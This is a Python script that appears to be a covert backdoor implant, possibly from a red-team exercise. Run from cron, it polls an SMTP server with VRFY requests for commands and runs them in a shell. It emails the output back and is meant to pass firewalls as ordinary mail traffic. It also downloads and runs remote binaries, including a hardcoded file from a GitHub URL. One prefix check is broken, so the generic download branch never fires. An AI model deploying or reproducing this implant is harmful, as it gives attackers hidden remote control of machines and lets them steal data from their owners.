'''
Requirements:
    Python 3.x with standard libraries
The plan:
    This will keep getting run by cron or something
    Sends a VRFY request to get a command
    Sends an email with the output
Ideally, this should look like normal SMTP traffic to any firewall... but it's not cool enough to do what DNS does
It should also be compatible with Windows or *NIX
'''
import smtplib
import socket
import subprocess
import getpass
import os
import urllib
SERVER = "localhost"
DEST_ADDR = "mailman@"+SERVER

def wget(cmd):
    #parse a "wg http://..." command
    #chmod +x downloaded file
    #xeq downloaded file
    url = cmd[3:]
    extension = cmd[-4:] #This is mostly for windows stuff
    fileName, headers = urllib.request.urlretrieve(url) #saves as temp file
    os.rename(fileName, fileName+extension)
    fileName += extension
    os.chmod(fileName, 0o555) #r-xr-xr-x
    print(fileName)
    out = subprocess.Popen([fileName], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    (stdout, stderr) = out.communicate()

def main():
    connection = smtplib.SMTP()
    connection.connect(SERVER, 25)
    connection.ehlo()
    username = getpass.getuser()
    # machineIP = socket.gethostbyname_ex(socket.gethostname())[-1][-1] #Tested on windows
    machineIP = socket.getfqdn() #should get full hostname/domain name
    emailAddr = username + "@" + machineIP
    code,command = connection.verify(emailAddr) #tuple of code and string response
    if(code != 250):
        return #Wait for next run
    command = command.decode("UTF-8")
    if len(command) > 3:
        if command[0:2] == "wg ":
            wget(command)
            return
    if command == "sojuman":
        wget("wg https://github.com/ChoiSG/sojuman/raw/master/dist/real_sojuman")
        return
    out = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    (stdout, stderr) = out.communicate()
    if stdout != None:
        stdout = stdout.decode("UTF-8")
    else:
        stdout = ""
    if stderr != None:
        stderr = stderr.decode("UTF-8")
    else:
        stderr = ""
    connection.sendmail(emailAddr, DEST_ADDR, stdout+"\n"+stderr)

main()